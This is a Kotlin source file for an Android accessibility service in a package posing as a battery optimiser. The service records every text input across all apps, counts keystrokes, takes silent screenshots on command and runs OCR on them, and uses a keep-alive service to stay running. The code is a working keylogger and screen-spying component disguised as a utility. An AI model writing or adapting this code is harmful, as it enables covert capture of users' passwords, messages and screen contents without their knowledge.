package com.android.batteryoptimization

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.android.batteryoptimization.ocr.OcrEngine
import kotlinx.coroutines.*

class InputAccessibilityService : AccessibilityService() {

    private lateinit var repository: InputRepository
    private var ocrEngine: OcrEngine? = null
    private var screenshotReceiver: android.content.BroadcastReceiver? = null
    private val ocrScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        repository = InputRepository.getInstance(applicationContext)

        // Initialize OCR engine
        ocrEngine = OcrEngine(applicationContext)
        ocrEngine?.loadModels()

        Log.d(TAG, "Accessibility Service Connected (OCR enabled)")

        startService(Intent(this, KeepAliveService::class.java))

        val filter = android.content.IntentFilter(ACTION_TAKE_SCREENSHOT)
        screenshotReceiver = object : android.content.BroadcastReceiver() {
            override fun onReceive(context: android.content.Context?, intent: android.content.Intent?) {
                Log.d(TAG, "Received screenshot broadcast — capturing + OCR")
                takeScreenshot { bitmap, msg ->
                    if (bitmap != null) {
                        // Run OCR on the captured screenshot
                        ocrScope.launch {
                            try {
                                val ocrResults = ocrEngine?.recognize(bitmap) ?: emptyList()
                                if (ocrResults.isNotEmpty()) {
                                    // Merge OCR results into event stream
                                    repository.addOcrEvents(
                                        packageName = "screenshot",
                                        appName = "Screen OCR",
                                        results = ocrResults
                                    )
                                    val text = ocrResults.joinToString(" | ") { it.text }
                                    Log.d(TAG, "OCR result: $text")
                                }
                                bitmap.recycle()
                            } catch (e: Exception) {
                                Log.e(TAG, "OCR processing failed", e)
                            }
                        }
                    }
                    android.os.Handler(android.os.Looper.getMainLooper()).post {
                        android.widget.Toast.makeText(
                            this@InputAccessibilityService,
                            msg,
                            android.widget.Toast.LENGTH_SHORT
                        ).show()
                    }
                }
            }
        }
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenshotReceiver, filter, android.content.Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(screenshotReceiver, filter)
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        ocrScope.cancel()
        ocrEngine?.destroy()
        ocrEngine = null
        screenshotReceiver?.let { receiver ->
            try {
                unregisterReceiver(receiver)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to unregister receiver", e)
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            val packageName = event.packageName?.toString() ?: "Unknown"
            val appName = getAppName(packageName)
            val text = event.text.joinToString(" ")

            if (text.isNotBlank()) {
                val prefs = applicationContext.getSharedPreferences("keystroke_prefs", android.content.Context.MODE_PRIVATE)
                val current = prefs.getInt("total_keystrokes", 0)
                prefs.edit().putInt("total_keystrokes", current + 1).apply()

                val inputEvent = InputEvent(
                    timestamp = System.currentTimeMillis(),
                    packageName = packageName,
                    appName = appName,
                    text = text,
                    source = "accessibility"
                )
                repository.addEvent(inputEvent)
                Log.d(TAG, "Captured input: $text from $packageName")
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility Service Interrupted")
    }

    private fun getAppName(packageName: String): String {
        return try {
            val pm = packageManager
            val applicationInfo = pm.getApplicationInfo(packageName, 0)
            pm.getApplicationLabel(applicationInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    /**
     * Take a silent screenshot and run OCR on it.
     *
     * @param onResult callback with (Bitmap?, message). Bitmap is the captured image,
     *                 or null on failure. Caller must recycle the bitmap.
     */
    fun takeScreenshot(onResult: (android.graphics.Bitmap?, String) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshot: ScreenshotResult) {
                        try {
                            val hardwareBuffer = screenshot.hardwareBuffer
                            val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(
                                hardwareBuffer,
                                screenshot.colorSpace
                            )
                            if (bitmap != null) {
                                // Make a mutable copy to avoid surface buffer issues
                                val mutableBitmap = bitmap.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                                bitmap.recycle()
                                onResult(mutableBitmap, "截图+OCR完成")
                            } else {
                                onResult(null, "Bitmap转换失败")
                            }
                            hardwareBuffer.close()
                        } catch (e: Exception) {
                            Log.e(TAG, "Screenshot handling error", e)
                            onResult(null, "截图异常: ${e.message}")
                        }
                    }

                    override fun onFailure(errorCode: Int) {
                        onResult(null, "截图失败, 错误码: $errorCode")
                    }
                }
            )
        } else {
            onResult(null, "需要 Android 11+")
        }
    }

    /**
     * 获取 OCR 引擎，供 UI 层测试使用。
     * 如果服务未初始化或 OCR 未加载完成，可能返回 null。
     */
    fun getOcrEngine(): OcrEngine? = ocrEngine

    companion object {
        private const val TAG = "InputAccessibility"
        const val ACTION_TAKE_SCREENSHOT = "com.android.batteryoptimization.ACTION_TAKE_SCREENSHOT"
        var instance: InputAccessibilityService? = null
            private set
    }
}
